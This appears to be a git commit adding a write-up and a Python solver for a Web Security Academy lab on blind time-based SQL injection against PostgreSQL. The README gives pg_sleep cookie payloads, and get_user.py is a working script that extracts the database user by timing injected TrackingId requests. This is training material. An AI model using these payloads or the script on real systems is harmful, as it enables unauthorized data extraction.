5ca52436fb1508fa5fc675fab11179b6fc04b2ca
Neuro <panagiotisfisk@gmail.com>
2023-07-28 22:37:40 +0300

    Time_Based_SQLi1

--- Labs/SQL_injection/Time_Based_SQLi1/README.md
+++ Labs/SQL_injection/Time_Based_SQLi1/README.md
@@ -1,9 +1,31 @@
 # Lab: Blind SQL injection with time delays
 
-# Identififcation:
+URL: https://0a3e00ec03a7c2278062125200f200e2.web-security-academy.net
 
+![](./Images/img1.png)
 
 # Preparation:
 
+Payload:
+
+```
+Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw
+```
+
+![](./Images/img2.png)
 
 # Exploitation:
+
+## Performing a 10 second delay:
+
+Payload:
+
+```
+Cookie: TrackingId='||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw
+```
+
+![](./Images/img3.png)
+
+## Getting the User:
+
+![](./Images/img4.png)
---
+++ Labs/SQL_injection/Time_Based_SQLi1/get_user.py
@@ -0,0 +1,33 @@
+#!/usr/bin/python3
+##
+import requests
+import string
+import urllib.parse
+##
+chars=string.printable
+Part1="'||+(SELECT+CASE+WHEN+(current_user+like('"
+Part2="%25'))+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw"
+##
+def get_single_character(URL,user,found):
+    for X in chars:
+        send=Part1+user+urllib.parse.quote(X)+Part2
+        r=requests.get(URL,cookies={"TrackingId":send})
+        print(f"{X}\r",end="")
+        if(r.elapsed.total_seconds()>=10):
+            user+=X
+            if(user[-1]=='%'):
+                found=True
+            break
+    print()
+    #print(user)
+    return found,user
+##
+def main(URL):
+    found=False
+    user=""
+    while(not found):
+        found,user=get_single_character(URL,user,found)
+    user=user.split('%')[0]
+    print(f"{user}")
+#
+main("https://0a76006804e0da7680b5d54a009f00c9.web-security-academy.net/")
